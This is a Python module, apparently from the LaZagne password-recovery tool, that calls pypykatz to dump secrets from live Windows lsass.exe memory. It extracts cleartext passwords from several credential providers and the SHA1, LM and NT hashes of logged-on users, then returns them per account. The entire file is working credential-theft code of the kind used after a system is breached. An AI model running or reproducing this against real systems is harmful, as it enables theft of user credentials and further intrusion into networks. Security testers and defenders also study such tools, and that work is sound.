# -*- coding: utf-8 -*-

# Thanks to @skelsec for his awesome tool Pypykatz
# Checks his project here: https://github.com/skelsec/pypykatz

import codecs

from lazagne.config.module_info import ModuleInfo
from lazagne.config.constant import constant


class Pypykatz(ModuleInfo):
    """
    Pypykatz dumps all secrets from the lsass.exe memory
    It does not work if:
    - LSASS is running as a protected process
    - A security product blocks this access
    """

    def __init__(self):
        ModuleInfo.__init__(self, 'pypykatz', 'windows', system_module=True)

    def run(self):
        mimi = None
        try:
            from pypykatz.pypykatz import pypykatz
            mimi = pypykatz.go_live()
        except Exception:
            pass

        if mimi:
            results = {}
            logon_sessions = mimi.to_dict().get('logon_sessions', [])
            for logon_session in logon_sessions:

                # Right now kerberos_creds, dpapi_creds and credman_creds results are not used
                user = logon_sessions[logon_session].to_dict()

                # Get cleartext password
                for i in ['ssp_creds', 'livessp_creds', 'tspkg_creds', 'wdigest_creds']:
                    for data in user.get(i, []):
                        if all((data['username'], data['domainname'], data['password'])):
                            login = data['username']
                            if login not in results:
                                results[login] = {}

                            results[login]['Domain'] = data['domainname']
                            results[login]['Password'] = data['password']

                # msv_creds to get sha1 user hash
                for data in user.get('msv_creds', []):
                    if data['username']:
                        login = data['username']
                    else:
                        login = user['username']

                    if login not in results:
                        results[login] = {}

                    if data['SHAHash']:
                        results[login]['Shahash'] = codecs.encode(data['SHAHash'], 'hex')
                    if data['LMHash']:
                        results[login]['Lmhash'] = codecs.encode(data['LMHash'], 'hex')
                    if data['NThash']:
                        results[login]['Nthash'] = codecs.encode(data['NThash'], 'hex')

            constant.pypykatz_result = results
            pwd_found = []
            for user in results:
                results[user]['Login'] = user
                pwd_found.append(results[user])

            return pwd_found
